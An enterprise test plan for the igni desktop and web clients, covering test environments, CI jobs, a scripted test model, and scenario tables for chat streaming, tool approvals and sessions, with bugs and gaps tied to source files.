# igni desktop and web client: enterprise test plan

## 1. Purpose

This plan lists, scenario by scenario, what has to be true before an enterprise can roll out igni's desktop app (`clients/tauri`) and web client (`clients/web`). Every scenario is written against the code in this repository at the time of writing (1.0.4, `igni-core.version`). Where the plan names a behaviour, it names the file that implements it.

Some scenarios cover a feature that the brief for this plan asked about but the code does not have, such as crash reporting, a diagnostics view, update channels or registry policy. Those scenarios are still listed. Their Expected column says **"not implemented — gap"**, so they read as findings rather than as invented behaviour. Section 9 collects every gap and bug with file:line references.

The backend is igni-core, which lives in a separate repository. Wherever a scenario depends on the backend's semantics (RPC names, `ws_auth.py`, managed settings, `group_policy`), the igni-core file is named.

## 2. Environments

| Environment | What it is | Used by |
|---|---|---|
| Node + jsdom | `clients/web`, vitest 1,700+ tests | vitest |
| Chromium + Vite dev server | `http://127.0.0.1:5179` (`clients/web/playwright.config.ts`), single `chromium` project | Playwright |
| Mocked backend | in-process `ws` server, `clients/web/e2e/fixtures/backend.ts` via `fixtures/embed.ts` (`/?ws=<mock>`), or a demo page (`/?demo=team\|plan\|hitl\|chat-scroll\|viz-stream\|workflow\|interrupted`) | Playwright fixture |
| Real backend | `python -m igni_core.backend --ws-port 0 --project-dir <tmp>` spawned by `clients/web/e2e/fixtures/live-be.ts` from `$IGNI_CORE_DIR/.venv` (default `../igni-core`); isolated HOME, pre-trusted temp project with `calc.py`, `calendar_utils.py`, `main.py`, `README.md`, `git init`, fake credentials `fixture@example.com` | Playwright real backend |
| Linux desktop | built `.deb`, `tauri-driver` + `WebKitWebDriver` under Xvfb + dbus (ubuntu-22.04 as in `release.yml`) | desktop WebDriver, job J2 |
| Windows desktop | MSI/NSIS silent install, `msedgedriver` (WebView2) attached to the running app on `windows-latest` | desktop WebDriver, job J3 |
| macOS desktop | `.app` built for `aarch64-apple-darwin` on `macos-26` (minimum system 26.0); headless launch, codesign and Info.plist checks | job J4 (the scripted bundle checks) and manual runs |
| Enterprise lab | VMs per OS with MDM-placed `managed-settings.yaml`, an egress-blocking firewall, a TLS-intercepting proxy with a custom CA, and an igni server for sign-in | manual |

**Supported targets in code.** The runtime installer knows macOS aarch64, Linux aarch64 and x86_64, and Windows x86_64 (`clients/tauri/src-tauri/src/runtime/uv.rs:53-60`); the release builds macOS Apple Silicon, Windows x86_64 and Linux x86_64 (`release.yml:136-143`). Intel macOS and Windows ARM get "unsupported platform" from the runtime installer.

## 3. Automation layers and how to run them

| Code | Method | How to run (from the repo root unless stated) |
|---|---|---|
| VT | vitest | `make test` (runs `npx vitest run --coverage` with the coverage floor in `clients/web/vite.config.ts`). A single file: `cd clients/web && npx vitest run src/chat/escHandler.test.ts`. Rust unit tests: `make tauri-test` (`cargo test --no-default-features` in `clients/tauri/src-tauri`). Everything CI runs except the browser: `make check`. |
| PWF | Playwright fixture (mocked WS or demo page) | `make install && make e2e`, or `cd clients/web && npx playwright test e2e/app.spec.ts`. CI runs it as `IGNI_E2E_STRICT=1 npx playwright test`, which makes an untagged skip fail the run (`e2e/reporters/skips.ts`). Visual baselines are regenerated only through `clients/web/scripts/baselines-linux.sh`. |
| PWR | Playwright real backend | Check out igni-core next to this repo and run `cd ../igni-core && uv sync --all-extras`; `live-be.ts` then spawns the backend from `.venv`. `IGNI_CORE_DIR` points at another checkout. Run `cd clients/web && npx playwright test e2e/live-*.spec.ts e2e/real-be.spec.ts`. `IGNI_LIVE_WS=ws://127.0.0.1:<port>` borrows a backend you started yourself (its window token comes from `IGNI_LIVE_WS_TOKEN`); against a spawned backend the `@needs-model` tests run against the scripted model (section 4), in CI too. `IGNI_E2E_TIMEOUT_FACTOR` scales the timeouts. |
| WD | desktop WebDriver | `.github/workflows/desktop-e2e.yml` builds and installs the app and runs `clients/tauri/e2e/desktop-e2e.mjs --suite first-launch\|air-gapped\|provisioned` (a dependency-free W3C client, `webdriver.mjs`). Linux: tauri-driver + WebKitWebDriver under `dbus-run-session -- xvfb-run`. Windows: msedgedriver attached to the running app (`debuggerAddress`); installs by `windows-install.ps1`. macOS: `macos-checks.sh` (no WebDriver for WKWebView). Locally: build the bundle, install it, set `IGNI_APP`, `IGNI_E2E_PYTHON` and (first launch) `IGNI_E2E_INDEX`, and run the same command. The process-level test stays `cargo test --no-default-features --test spawn_smoke -- --ignored` (CI `tauri-smoke`). |
| MAN | manual | Lab runbook; record the evidence (screenshot, log excerpt, command output) against the scenario id. |

**CI jobs.** The Automation column tags each scenario that fits one of them; the Status column says which already run:

- **J1**: Playwright real-backend specs under `clients/web/e2e/` (`live-*`, `real-be`, `watcher-*` and the scenario specs `scenario-*.spec.ts`), in `ci.yml`'s Web E2E job. They run against a spawned igni-core backend (main) wired to the scripted OpenAI-compatible model server (section 4). They are deterministic and need no API key.
- **J2**: Linux desktop E2E (`desktop-e2e.yml`, ubuntu-22.04). Installs the built `.deb` and drives it with `tauri-driver` + `WebKitWebDriver` under Xvfb; first launch installs the managed runtime from a package index the job builds (igni-core from main), so it is deterministic.
- **J3**: Windows desktop E2E (`desktop-e2e.yml`, windows-latest). Installs and removes the NSIS and MSI packages silently, smoke-launches the installed app, and drives it with `msedgedriver` attached to it. On this branch the job is red in one step: the `igni://` link does not bring the app to the page (F15).
- **J4**: macOS (`desktop-e2e.yml`, macos-26). Builds the `.app` (ad-hoc signed), checks codesign, entitlements and the Info.plist `igni://` registration, launches it headless on a provisioned runtime, sends an `igni://` link, quits and kills it, and checks its backend goes each time.

## 4. The scripted model

igni-core has no fake model, so the suite brings one: `scripts/e2e/scripted_model.py`, a standard-library, OpenAI-compatible server (`POST /v1/chat/completions`, streamed or not, with `tool_calls`; `GET /v1/models`). Every spawned backend's registry points at it (`live-be.ts` starts one per Playwright worker; the desktop runner starts its own), so CI holds no API key and every turn is the same turn every run.

It answers from directives in the **last user message**, so a test says what the model does in what it types:

| Directive | Effect |
|---|---|
| `Reply with exactly WORD` | the reply is `WORD` (the live specs' "echo this token" checks) |
| `[[tool NAME {json}]]` | the first answer calls tool `NAME`; after its result, the rest of the message is answered. Several run in order. A side request with no tools offered (title, explanation) is answered in words |
| `[[slow MS]]` | every streamed chunk waits `MS` ms (cancel tests) |
| `[[lines N]]` | `N` numbered lines (long transcripts) |
| `[[big N]]` | one line of `N` characters, streamed in 16 KB frames (oversized content) |
| `[[b64 …]]` | the decoded text, verbatim (hostile markdown, links) |
| `[[status CODE]]` | the request fails with HTTP `CODE` (provider errors) |
| `[[hang]]` | never answers (cancel before the first token) |
| `[[die]]` | half a stream, then the server exits |

A message that mentions a "shell tool" gets one `run_shell_command` call, and every reply ends with the message's `TKN…` markers. Every request is logged, so a test asserts what the backend sent (`scriptedModel.requests(since)`: the `model` after a switch, no call at all under a policy refusal). `scripts/e2e/forward_proxy.py` is a logging egress proxy (names under `.e2e.test` resolve only through it) and `scripts/e2e/make_simple_index.py` turns a wheelhouse into the PEP 503 index the desktop jobs install the runtime from.

## 5. Conventions

- **Ids are stable.** An id is never reused or renumbered. A retired scenario keeps its row with status "Retired".
- **Tests carry the id at the start of their title** where the test belongs to this suite: the four `e2e/scenario-*.spec.ts` specs, `src/components/markdown/ChatMarkdown.test.tsx`, `clients/tauri/e2e/desktop-e2e.mjs` and `clients/tauri/e2e/macos-checks.sh` — for example `test("CHAT-004 Stop while a tool runs ends the run long before the tool would", ...)`. One test may cover several ids (`"SEC-013 SEC-017 ..."`). `grep -rn "CHAT-004" clients/` finds that test. The tests that existed before this suite carry no id: they are cited by their file, and a Rust test by its module file, so for those rows the Status column's evidence is the mapping from id to test.
- **Status values.** Every row's Status cell starts with exactly one of these four:
  - **"Covered: <file>"** — an existing test asserts the expected result. A row that is only partly covered says so after the evidence: "; <the rest> stays open" or "; <the rest> stays planned".
  - **"Fixed in this branch"** — the defect the scenario names was fixed on this branch, and a test pins it.
  - **"Open; <reason>"** — the suite confirmed a defect that is not fixed yet.
  - **"Planned"** — nothing runs it yet. A parenthetical names what *is* covered.
  - Section 10's State column uses the same four values.
- **Path prefixes in the Status column:**
  - Web test paths are relative to `clients/web/`.
  - `src-tauri/...` is relative to `clients/tauri/`.
  - A Rust unit test is cited by its module file; its tests sit in that file's `mod tests`.
- **Platform codes:** M macOS, W Windows, L Linux, Web = the web client in a browser. "Desktop" = M W L; "All" = M W L Web.
- **Area:** the section a scenario sits in.
- **Expected results are what the product should do.** Where the code does something else, the row says so and names the line. Such rows stay "Planned" until the product is fixed and the test passes.

## 6. Live specs were red on main: why, and the fix

Every real-backend spec on main's CI sat at "Connecting to backend…" until it timed out (`real-be`, `live-affordances`, `live-composer`, `live-slash`, `live-be-plan-decision`, `live-edges`, `watcher-*`). The cause: since igni-core's `transport/ws_auth.py`, a backend requires a window token from every browser connection, and one started by hand mints its own and prints it once to stderr. `live-be.ts` gave it none, so the app's handshake was refused. The fixture is now the launcher, as the desktop shell is: a per-launch `IGNI_WS_TOKEN` in the child's environment, and the same token handed to every page as `window.__IGNI_WS_TOKEN__`; specs that open a raw socket offer it as the `igni-token.` subprotocol. With the scripted model (section 4) the `@needs-model` specs run in CI too.

`live-edges.spec.ts` "a message queued from another session eventually runs" was `test.fixme()` and is green now: it was held for the same igni-core defect as CHAT-012 (F4), and igni-core cefccc4f fixed it. Both markers went with the bug — the `test.fixme()` here and CHAT-012's `test.fail()`. A `test.fail()` is not free: it fails the job the day the bug is fixed, which is how a fixed defect turns into a red pipeline instead of a green row.

On this branch J1 is green: 238 tests passed, 15 did not run, and every one of the 15 is declared — 14 `@manual` screenshot specs and the `test.fixme()` above. The reporter (`e2e/reporters/skips.ts`) prints the list and fails the job under `IGNI_E2E_STRICT=1` if a skip is not declared. With the `test.fixme()` gone, that case runs instead of skipping, so the declared skips are the `@manual` ones alone.

CHAT-020 was the last red row on the branch, and it was the test's own arithmetic rather than the app's: the backend quotes the interrupted question verbatim in its recap ("The user had asked: '…'"), and the scripted model reads the directives out of that quote — so the *recovery* turn answered with the same number of lines at the same pace the crash was meant to interrupt, and the turn ran for about three minutes against a one-minute wait. The directive is now `[[slow 150]] [[lines 20]]`: about 18 seconds, long enough to be interrupted, short enough to be answered again once the backend is back.

## 7. Summary

| Area | Prefix | Total | Covered before this branch | Covered by this branch's suite | Planned, automatable | Planned, manual |
|---|---|---:|---:|---:|---:|---:|
| Chat and streaming | CHAT | 32 | 7 | 13 | 11 | 1 |
| Tools and approvals | TOOL | 17 | 4 | 8 | 5 | 0 |
| Sessions | SESS | 19 | 5 | 6 | 8 | 0 |
| Models | MODEL | 10 | 2 | 4 | 3 | 1 |
| Extensions | EXT | 24 | 13 | 4 | 7 | 0 |
| Sign-in and organisation | AUTH | 15 | 5 | 1 | 5 | 4 |
| Security | SEC | 35 | 7 | 13 | 12 | 3 |
| Enterprise deployment | ENT | 38 | 5 | 13 | 12 | 8 |
| Platforms | PLAT | 20 | 2 | 8 | 7 | 3 |
| Accessibility | A11Y | 15 | 4 | 0 | 9 | 2 |
| Performance and resilience | PERF | 11 | 2 | 0 | 6 | 3 |
| Diagnostics | DIAG | 12 | 4 | 3 | 2 | 3 |
| **Total** | | **248** | **60** | **73** | **87** | **28** |

"Covered before this branch" counts rows a test that existed before this suite covers (a vitest file, a Playwright fixture spec, a Rust test). "Covered by this branch's suite" counts the rows a spec this branch added or repaired covers (`scenario-*.spec.ts`, the live and watcher specs it made run again, `real-be.spec.ts`) and the rows a desktop job (J2, J3, J4) covers, including the one product bug kept as `test.fail()` (CHAT-027). "Planned, automatable" means the Automation column names vitest, Playwright or desktop WebDriver, or one of J1–J4, and nothing runs it yet. "Planned, manual" means the Automation column names only manual work.

## 8. Scenarios

Legend for the Automation column:

| Code | Method |
|---|---|
| VT | vitest |
| PWF | Playwright fixture (mocked WS or demo page) |
| PWR | Playwright real backend |
| WD | desktop WebDriver |
| MAN | manual |

J1–J4 are the CI jobs in section 3.

### 8.1 Chat and streaming (CHAT)

| ID | Preconditions | Steps | Expected | Plat | Automation | Status |
|---|---|---|---|---|---|---|
| CHAT-001 | Mocked backend, session bound | Type "hello" in the composer (placeholder `Message igni — / commands, @ files, $ shell`), press Enter; push `content_delta` frames | A `user_message` frame is sent; the deltas render in the assistant bubble | All | PWF | Covered: e2e/app.spec.ts ("typing + Enter sends a user_message envelope", "BE streams content_delta") |
| CHAT-002 | Real backend, scripted model `text` in 5 chunks | Send "ping" | The reply streams in progressively; while running the button is Stop (`title="Stop (Esc)"`), afterwards Send; the composer is editable again; `count_context_tokens` and `list_sessions` are called after `run_completed` | All | PWR J1; smoke in WD J2/J3 | Covered: e2e/scenario-chat.spec.ts, e2e/live-chat.spec.ts (J1, scripted model); desktop: J2 Linux, J3 Windows `CHAT-002` |
| CHAT-003 | Real backend, script `stall(5000)` then text | Send, then click Stop before the first token | One `{type:"cancel"}` frame; the phase goes to `cancelled` and the "Run cancelled" banner shows (`useTranscriptState.ts:43`); the model server receives no further request for this turn; the next message is answered | All | PWR J1 | Covered: e2e/scenario-chat.spec.ts (J1; Stop before the first token, next turn answered) |
| CHAT-004 | Real backend, session in `/bypass`, script `toolCall` shell `sleep 30` | Send; when the tool card shows running, click Stop | The cancel is sent; the tool card does not stay "running"; the `sleep` child process is gone (Watcher panel shows nothing left); the composer is usable. Cancelling has no tool-specific handling in the client (`useRunPhase.ts:69`) | All | PWR J1 | Covered: e2e/scenario-chat.spec.ts (J1; Stop during an approved `sleep 40`, run ends in < 30 s, the command's side effect never happens) |
| CHAT-005 | Real backend, script streams 200 chunks at 50 ms | Click Stop mid-stream, then send a second message | Streaming stops; the partial text stays; the second reply is a clean new turn with no stray deltas from the cancelled run | All | PWR J1 | Covered: e2e/scenario-chat.spec.ts, e2e/live-edges.spec.ts (J1) |
| CHAT-006 | A run is processing; no menu open | Press Escape; then open the `/` menu during a run and press Escape | The first Escape sends one `cancel`; Escape inside a menu only closes the menu and the run continues (`composerKeymap.ts:101`) | All | VT | Covered: src/App.test.tsx ("Escape cancels it"), src/chat/escHandler.test.ts, src/components/composer/composerKeymap.test.ts |
| CHAT-007 | Approval pending (`run_paused`) | Press Escape | One `hitl_response_batch` rejects every pending requirement, then a `cancel` is sent; the dialog closes | All | VT | Covered: src/chat/useHitl.test.tsx, src/chat/escHandler.test.ts; real backend: e2e/scenario-tools.spec.ts (J1, the tool never runs) |
| CHAT-008 | Approval pending, Stop button visible | Click Stop | Pending approvals are rejected and the dialog closes, as with Escape. **Bug:** `onStop` is `useRunPhase.cancel` (`AppComposer.tsx:66`, `useRunPhase.ts:69`), which neither rejects nor clears the HITL list (`useHitl.ts:40-50`). The dialog stays up | All | PWF | Planned: **Correction from J1:** with a real backend the Stop button is not shown while an approval waits — the run's stream has ended (`streaming_done` before `run_paused`), the phase is `finalizing` and the composer shows Send and the label "Finalizing…". Escape cancels (CHAT-007). Gap: no visible Stop, misleading label |
| CHAT-009 | Run in `finalizing` (after `streaming_done`, before `run_completed`) | Look for Stop; press Escape; separately, type and send a message | Stop is hidden (`ComposerBar.tsx:63` uses `isProcessing`) but Escape still cancels: inconsistent. A message sent while finalizing goes out as a new run instead of queuing (`runPhase.ts:64`). The expected result is one consistent rule | All | PWF | Planned |
| CHAT-010 | Backend disconnected (composer shows "Connecting to backend…") | Press Escape while a stale run phase is set; click Cancel in the login panel | Nothing throws. **Bug:** `client.cancel()` and `cancelLogin()` call `send`, which throws "not connected to backend" (`protocol/client.ts:250`) inside the keydown handler | All | VT | Planned |
| CHAT-011 | A run is processing | Type "second" and press Enter | A `queue_message` frame is sent; the bubble shows "Queued — will run after the current turn."; when its run starts the bubble is promoted and it runs as its own turn | All | VT | Covered: src/chat/messageSubmitter.test.ts, src/chat/serverMessageReducer.test.ts |
| CHAT-012 | Real backend, slow script | While a run streams, queue three messages | All three run in order, each as its own turn with its own reply; none is merged or lost. Queued messages cannot be edited or removed (no UI) | All | PWR J1 | Covered: e2e/scenario-chat.spec.ts (J1) — green. The igni-core bug this row was kept red-on-fix for is fixed (igni-core cefccc4f, "A message queued during a run is the next turn when no tool call took it"): the backend drains what is left in the queue when the run ends (`backend/message_dispatcher.py`, `_run_queued`). The `test.fail()` marker went with the bug |
| CHAT-013 | Real backend | Type `/ctx` while a run streams | The command is not queued; it goes to the backend at once as a `command` frame and answers without disturbing the run | All | PWR J1 | Planned |
| CHAT-014 | Real backend, two views on different sessions | Queue a message to session A from a view bound to session B's flow (as in the spec) | The queued message eventually runs. **Known bug (fixed):** it never started; the test was `test.fixme()`. igni-core cefccc4f — "A message queued during a run is the next turn when no tool call took it" — makes the backend drain what is left in the queue when the run ends (`backend/message_dispatcher.py`, `_run_queued`) | All | PWR J1 | Covered: e2e/live-edges.spec.ts (J1) — the `test.fixme()` is gone; the queued message runs in the new session |
| CHAT-015 | Real backend idle | Type and send 20 short messages within 2 s | The first starts a run and the rest queue; every message appears exactly once, in order, with a unique `run-…` id; no reply is attached to the wrong bubble | All | PWR J1 | Planned |
| CHAT-016 | Real backend | Click "+ New chat" and immediately send a message (delay the `/clear` `command_result` with `routeWebSocket`) | The message lands in the new session and is answered | All | PWR J1 | Covered: e2e/live-chat.spec.ts (runs in J1 now, scripted model) |
| CHAT-017 | Demo `?demo=chat-scroll` | Load 60 rows, scroll, append rows at and away from the bottom | Starts at the top; reaching the last row sets atBottom; appending at the bottom follows; appending while scrolled away does not move the user | All | PWF | Covered: e2e/chat-scroll.spec.ts |
| CHAT-018 | Real backend, script `huge` produces a 200 KB markdown answer with a 5,000-line fenced block | Send; scroll through the answer; use "Expand code" | It renders; the code block collapses above 220 px with "Expand code"/"Collapse code" and "Copy code"; the window stays responsive (no long task > 1 s after the stream ends). There is no truncation of oversized text (gap, see SEC-007) | All | PWR J1 | Covered: e2e/scenario-chat.spec.ts (J1; 3,000 lines, a frame within 1 s, the next turn in view); found and fixed in this branch: sending scrolls the transcript to its end (`AppComposer` `onSend`) |
| CHAT-019 | Mocked backend, run in flight | Close the server (`backend.close()`) | The composer flips to "Connecting…" and recovers when the backend returns | All | PWF | Covered: e2e/app.spec.ts ("server crash → composer flips", "BE accepts then dies"), src/App.test.tsx ("goes back to Connecting…") |
| CHAT-020 | Real backend, streaming reply | Kill the backend process (SIGKILL) mid-answer; restart it on the same port with the same HOME | During the outage the header dot reads `backend disconnected` and the composer is disabled. After reconnect, `get_pending_messages` restores the interrupted prompt with the recovery banner (Retry / Discard / Edit). **Gap:** the cut-off reply settles as `done`, not interrupted, because `failAll` ends streams with a synthetic `stream_end` (`replyCorrelator.ts:95-106`, `runStreamer.ts:115`). No banner shows during the outage | Web | PWR J1 | Covered: e2e/scenario-chat.spec.ts (J1; SIGKILL mid-answer → "Connecting to backend…", restart on the same port → reconnects, next turn answered); the interrupted-reply gap stays open |
| CHAT-021 | Desktop app, backend spawned by the shell | Kill the `igni_core.backend` process mid-answer | **Gap:** the shell has no watchdog after the ready line, so the window stays "Connecting to backend…" forever. Recovery is File › Restart Backend, after which every window comes back on its folder and the new port | Desktop | WD J2, J3; J4 headless | Planned |
| CHAT-022 | Real backend | Drop the WS (stop the backend for 3 s) and bring it back | Reconnect after 500 ms, doubling to a 5 s ceiling; the token is offered again; the bound session is kept and its history reloaded | All | VT | Covered: src/protocol/client.reconnect.test.ts, src/chat/sessionSwitcher.test.ts; real backend: e2e/scenario-chat.spec.ts (J1, socket severed) |
| CHAT-023 | Real backend, script `httpError(503, 2)` then text | Send | The `RetryBanner` shows attempt and backoff and clears on success; the reply arrives. Banner logic is unit-tested in src/components/RetryBanner.test.tsx | All | PWR J1 | Planned |
| CHAT-024 | Desktop, network cable pulled or Wi-Fi off during a run (model is remote) | Pull the network mid-answer, restore after 60 s | The loopback WS stays up; the run ends with a visible error or retry banner, not a silent hang; the next message works after restore | Desktop | MAN | Planned |
| CHAT-025 | Mocked backend, two pages on the same session | Push events | Both pages render them (mirroring) | All | PWF | Covered: e2e/app.spec.ts ("two pages bound to the same session both render its events") |
| CHAT-026 | Mocked backend, two pages on different sessions | Push events stamped with one `session_id` | Only that session's page renders them | All | PWF | Covered: e2e/app.spec.ts ("two pages bound to different sessions") |
| CHAT-027 | Web client, real backend | Open the app in two tabs of one browser profile | Both tabs use localStorage `ember-code:client-id` (`clientState.ts:50`), so the second displaces the first: the backend closes with 1008 and the first tab shows the chip "opened elsewhere — reconnect" without auto-reconnect. Clicking it displaces the other tab back. Expected for enterprise use: two tabs can coexist. Recorded as a gap | Web | PWR J1 | Open; e2e/scenario-chat.spec.ts is `test.fail()` — the second tab lands on the first tab's session, its socket is displaced, and its message gets no answer |
| CHAT-028 | Desktop app | File › New Window… (Cmd/Ctrl+Shift+N), pick a second folder, run a turn in each window at once | Each window (`main`, `w-2`) has its own client id (`:<label>` suffix), session and folder; neither window shows the other's events | Desktop | WD J2, J3 | Planned |
| CHAT-029 | Real backend, run streaming | Pick another session in the sidebar mid-run | No text from the running session bleeds into the newly shown one | All | PWR J1 | Covered: e2e/live-edges.spec.ts (runs in J1 now) |
| CHAT-030 | Mocked backend | Push a frame that is not valid JSON | The frame is dropped and the connection stays usable. **Bug:** `ws.onmessage` calls `JSON.parse` without try/catch (`protocol/client.ts:94`) | All | VT | Planned |
| CHAT-031 | Real backend, script `httpError(400, many)` | Send | A `run_error` row shows, the phase ends `errored`, and the composer is usable. **Gap:** `run_error` appends a row but never sets `errored` or marks the reply interrupted (`serverMessageReducer.ts:126`) | All | PWR J1 | Covered: e2e/scenario-chat.spec.ts (J1, HTTP 500 from the model — the visible error and the usable composer); the `errored` phase gap stays open |
| CHAT-032 | Mocked backend | Push `tool_started` for A and B, then `tool_completed` for A | A's card gets A's result. **Bug:** completion and error patch "the most recent running tool", not by id (`serverMessageReducer.ts:63,76`), so B gets A's result | All | VT | Planned |

### 8.2 Tools and approvals (TOOL)

| ID | Preconditions | Steps | Expected | Plat | Automation | Status |
|---|---|---|---|---|---|---|
| TOOL-001 | Demo `?demo=team` | Open the single-approval and batch scenarios | A single approval has no step counter; a batch walks 1/3 → 2/3 → 3/3; the team card and dialog coexist | All | PWF | Covered: e2e/demo.spec.ts |
| TOOL-002 | Real backend, default mode, script `toolCall("Edit", calc.py)` | Send "fix calc" | `HitlDialog` renders inside the composer: "Allow <friendly_name>?" for the Edit tool, "Working out what this call would do…" while `requirement_details` is pending, then the args and diff (`HitlArgsView`) | All | PWR J1 | Planned |
| TOOL-003 | As TOOL-002 | Click "Allow once"; the script then requests the same edit again | The frame is `hitl_response_batch` with `action:"confirm", choice:"once"`; the file changes; the second call asks again | All | PWR J1 | Covered: e2e/scenario-tools.spec.ts (J1, shell `touch` asked, allowed once, file created); desktop: J2 Linux, J3 Windows `TOOL-003` |
| TOOL-004 | As TOOL-002 | Click "Always allow"; the script repeats the same tool | `choice:"always"`; no dialog for the repeat. Record where igni-core persisted the rule and whether a new session honours it | All | PWR J1 | Covered: e2e/scenario-tools.spec.ts (J1; the same call is not asked again in the session) |
| TOOL-005 | As TOOL-002 | Click "Allow similar"; the script then edits `main.py`, then runs a different tool | `choice:"similar"`; the similar edit is not asked; a different tool is asked | All | PWR J1 | Planned |
| TOOL-006 | As TOOL-002 | Click "Reject" | `action:"reject", choice:""`; the tool card shows "Not run"; the model receives the rejection and the run ends cleanly | All | PWR J1 | Covered: e2e/scenario-tools.spec.ts (J1; not run, no error, the turn ends) |
| TOOL-007 | Batch of 3 requirements | Answer confirm, reject, confirm | Only the last click resolves; the batch carries all three decisions in order | All | VT | Covered: src/components/HitlDialog.test.tsx |
| TOOL-008 | Edit tool, default mode | Click "Accept all edits during this session" | `set_permission_mode:"acceptEdits"` is sent and all pending edits are confirmed. **Gap:** the label says "during this session", but `/accept off` is sent at `streaming_done` (`useChatController.ts:73`), so it lasts one run. Label and behaviour must agree | All | PWR J1 | Planned (button visibility and resolution covered in src/components/HitlDialog.test.tsx) |
| TOOL-009 | Real backend, approval pending | Reload the page | The dialog reappears and the run can continue. **Likely gap:** the client never asks for pending approvals; there is no such RPC and state is plain `useState` (`useHitl.ts:28`). It reappears only if the backend rebroadcasts `run_paused` | All | PWR J1 | Covered: e2e/scenario-tools.spec.ts (J1). **Correction:** the dialog does reappear after a reload (the backend rebroadcasts `run_paused`), and answering it runs the call |
| TOOL-010 | Real backend, approval pending in window A | Open the same session in a new tab or window B; answer in B | B shows the dialog; answering in B dismisses A's (`requirement_resolved`) | All | PWR J1; WD J2 | Covered: e2e/scenario-tools.spec.ts (J1; answered in the second tab, the first tab's dialog goes) |
| TOOL-011 | Batch of 3 shown in A and B | Answer requirement 1 in B, then continue in A | A's cursor moves to the next unanswered requirement. **Bug:** `index`/`decisions` live in state and are not reset when `requirements` shrinks (`HitlDialog.tsx:61`); the cursor can skip one or run past the end, rendering `null` while approvals remain | All | VT | Planned |
| TOOL-012 | Real backend | Type `$echo IGNI_SHELL_OK`, then `$false` | The output shows with no approval; the failing command reports its exit code | All | PWR | Covered: e2e/live-composer.spec.ts (green again in J1) |
| TOOL-013 | Approval pending | Run `/clear`, or pick another session, or `/fork` | Stale approvals for the old session disappear. **Gap:** the HITL list is not cleared on session pick, `/clear` or `/fork` (`sessionSwitcher.ts:53`) | All | PWF | Planned |
| TOOL-014 | Mocked and real backend | `plan_submitted` push; click Approve, then Refine on another plan | `approve_plan(run_id)` / `dismiss_plan` are sent; the card flips only on `plan_decided`, routed by `run_id`; the real RPC returns the right shape and flips the mode | All | PWF, PWR | Covered: e2e/plan-card.spec.ts, e2e/live-be-plan-decision.spec.ts (green again in J1) |
| TOOL-015 | Real backend | Run `/plan`, `/accept`, `/bypass` and back | The mode badge switches each time and back | All | PWR | Covered: e2e/live-slash.spec.ts (green again in J1) |
| TOOL-016 | Tool output wrapped in the backend's untrusted-output tags | Render the tool card | The tags are stripped for display only | All | VT | Covered: src/chat/toolOutput.test.ts |
| TOOL-017 | Demo, 40 tool calls in one turn | Open the wall-of-tools scenario | The card stays bounded in height | All | PWF | Covered: e2e/demo.spec.ts |

### 8.3 Sessions (SESS)

| ID | Preconditions | Steps | Expected | Plat | Automation | Status |
|---|---|---|---|---|---|---|
| SESS-001 | Real backend with three seeded sessions | Open the sidebar "Sessions" list (`list_sessions`) and click an older row | "Loading session xxxxxxxx…", then that session's history and "Resumed session xxxxxxxx."; the empty state reads "No past sessions" | All | PWR J1 | Planned |
| SESS-002 | Mocked backend | Window had a stored session; the stored one cannot be attached | It resumes the stored session; on failure it falls back to the backend's default session | All | VT | Covered: src/chat/sessionSwitcher.test.ts |
| SESS-003 | Mocked backend with history | Mount the app | `get_chat_history` renders | All | PWF | Covered: e2e/app.spec.ts ("history loaded from get_chat_history renders on mount") |
| SESS-004 | Any | Click "+ New chat" (sends `/clear`) | The view empties to the welcome hero; the new id follows; the draft is carried; the new chat is listed first | All | VT | Covered: src/chat/sessionSwitcher.test.ts ("/clear follows the renewed id…") |
| SESS-005 | Real backend, a session with 3 turns | `/clear`, then reopen the old session from the sidebar | The transcript is empty under a new id; the old session is intact and resumable | All | PWR J1 | Covered: e2e/scenario-enterprise.spec.ts (J1; reopened from the sidebar with its transcript) |
| SESS-006 | Real backend, a session with turns | `/fork` | It continues under a new id with history kept; "Forked to a new session…"; the original is unchanged | All | PWR J1 | Covered: e2e/live-slash.spec.ts `/fork` (runs in J1 now) |
| SESS-007 | Desktop, a session in folder A | Quit and relaunch on folder A; then launch on folder B | Folder A's session is listed and resumable. A stored session from another folder is ignored (`sessionBinding.ts`). Per FEATURE_STATUS, a crash restart starts a fresh session | Desktop | WD J2, J3 | Planned (folder rule unit-covered in src/chat/sessionBinding.test.ts) |
| SESS-008 | Real backend, one session with 5,000 messages seeded | Open it | It loads in under the agreed budget (proposed: < 3 s to first paint). **Gap:** `get_chat_history` has no pagination and loads the whole session (`historyLoader.ts:35`) | All | PWR J1 | Planned |
| SESS-009 | Real backend, 1,000 sessions seeded | Open the sidebar | It renders, scrolls and stays responsive while `StatusSource` polls. **Gap:** no pagination, search, delete or rename UI in `Sidebar.tsx` | All | PWR J1 | Planned |
| SESS-010 | Real backend, a long session | Cmd/Ctrl+F, search a word | `search_chat` (limit 50, 150 ms debounce) results jump to the turn; snippets omit `system-context`/`attached-files` | All | PWR J1 | Planned (snippet stripping unit-covered in src/components/ChatSearchBar.test.ts) |
| SESS-011 | A session with persisted runs | Edit an earlier prompt; Retry; Discard an interrupted run | `truncate_history` trims on the backend; a refused truncation keeps everything and says why; Discard drops the matching interrupted record | All | VT | Covered: src/chat/transcriptEdits.test.ts |
| SESS-012 | Backend crashed during a run (pending messages present) | Reopen the session | The interrupted prompts are restored with the recovery banner (Retry / Discard / Edit, keyboard Enter / Backspace / e) | All | VT | Covered: src/chat/historyLoader.test.ts, src/components/InterruptedBanner.test.tsx, src/components/chatItems/AssistantMessage.test.tsx |
| SESS-013 | Machine with 1.0.3 data: `~/.ember/` (sessions, config, credentials) and `<project>/.ember/` | Install 1.0.4 over it and launch on that project | igni-core renames `~/.ember` → `~/.igni` and `.ember` → `.igni` once (`igni-core/src/igni_core/core/dir_migration.py`); old sessions are listed and resumable; credentials still signed in. **Doc finding:** docs/releases/v1.0.4.md says "Nothing about your settings, sessions or connections moves", but the directories do move | Desktop | WD J2, J3; MAN on M | Planned |
| SESS-014 | Both `~/.ember` and `~/.igni` exist; or `~/.ember` is a symlink | Launch 1.0.4 | The migration does not merge and does not follow the symlink; the legacy dir is used only if the new one is absent (`core/paths.py`). The user is told which directory is in use (today nothing is said: gap) | Desktop | PWR J1 (seeded HOME) | Planned |
| SESS-015 | Real backend | `/rename` with no argument; `/rename` that the backend did not perform | The usage text answers; the client refuses to confirm a rename it did not make | All | PWR | Covered: e2e/live-slash.spec.ts (green again in J1) |
